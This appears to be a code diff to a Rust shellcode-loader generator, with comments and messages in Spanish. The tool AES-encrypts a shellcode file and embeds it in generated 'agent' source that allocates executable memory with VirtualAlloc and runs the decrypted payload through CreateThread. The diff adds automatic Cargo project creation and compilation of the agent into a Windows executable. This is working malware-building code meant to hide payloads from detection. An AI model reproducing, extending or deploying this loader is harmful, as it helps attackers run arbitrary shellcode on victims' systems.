@@ -13,6 +13,7 @@ use cbc::{cipher::{block_padding::Pkcs7, BlockEncryptMut, BlockDecryptMut, KeyIv
 use rand::RngCore;
 use std::fs::File;
 use std::io::{Read, Write};
+use std::process::Command;
 
 type Aes256CbcEnc = Encryptor<Aes256>;
 type Aes256CbcDec = Decryptor<Aes256>;
@@ -55,6 +56,26 @@ pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box
 
     println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());
 
+
+
+
+// Creación de Proyecto Cargo automáticamente
+    // Create Cargo.toml for the agent
+    let cargo_toml = format!(r#"[package]
+name = "{}"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+aes = "0.8"
+cbc = "0.1"
+winapi = {{ version = "0.3", features = ["winnt", "memoryapi", "processthreadsapi", "synchapi", "winbase", "minwindef", "ntdef", "handleapi"] }}
+
+[[bin]]
+name = "{}"
+path = "src/main.rs"
+"#, output_name, output_name);
+
     // Create the agent code with embedded encrypted data
     let agent_code = format!(r#"use aes::Aes256;
 use cbc::{{cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}}, Decryptor}};
@@ -62,7 +83,8 @@ use std::mem::transmute;
 use std::ptr::copy;
 use winapi::um::winnt::{{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE}};
 use winapi::um::memoryapi::VirtualAlloc;
-use winapi::um::processthreadsapi::{{CreateThread, WaitForSingleObject}};
+use winapi::um::processthreadsapi::CreateThread;
+use winapi::um::synchapi::WaitForSingleObject;
 use winapi::um::winbase::INFINITE;
 use winapi::shared::minwindef::DWORD;
 
@@ -117,13 +139,46 @@ fn main() {{
         iv
     );
 
-    // Write the agent file
-    let agent_file = format!("{}.rs", output_name);
-    let mut output_file = File::create(&agent_file)?;
-    output_file.write_all(agent_code.as_bytes())?;
+    // Create project directory
+    let project_dir = format!("{}_project", output_name);
+    std::fs::create_dir_all(format!("{}/src", project_dir))?;
 
-    println!("✅ Agente generado: {}", agent_file);
-    println!("📝 Para compilar: rustc {} -o {}.exe", agent_file, output_name);
+    // Write Cargo.toml
+    let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
+    cargo_file.write_all(cargo_toml.as_bytes())?;
+
+    // Write main.rs
+    let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
+    main_file.write_all(agent_code.as_bytes())?;
+
+    println!("✅ Proyecto generado: {}/", project_dir);
+    println!("🔧 Compilando automáticamente...");
+
+    // Compile automatically using cargo
+    let output = Command::new("cargo")
+        .args(&["build", "--release"])
+        .current_dir(&project_dir)
+        .output()?;
+
+    if output.status.success() {
+        println!("✅ Compilación exitosa!");
+        println!("🏃 Ejecutable generado: {}/target/release/{}.exe", project_dir, output_name);
+        
+        // Copy the executable to current directory for easy access
+        let exe_path = format!("{}/target/release/{}.exe", project_dir, output_name);
+        let dest_path = format!("{}.exe", output_name);
+        
+        if let Err(e) = std::fs::copy(&exe_path, &dest_path) {
+            println!("⚠️  No se pudo copiar el ejecutable: {}", e);
+        } else {
+            println!("📦 Ejecutable copiado a: {}", dest_path);
+        }
+    } else {
+        println!("❌ Error durante la compilación:");
+        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
+        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
+        return Err("Compilación fallida".into());
+    }
     
     Ok(())
 }
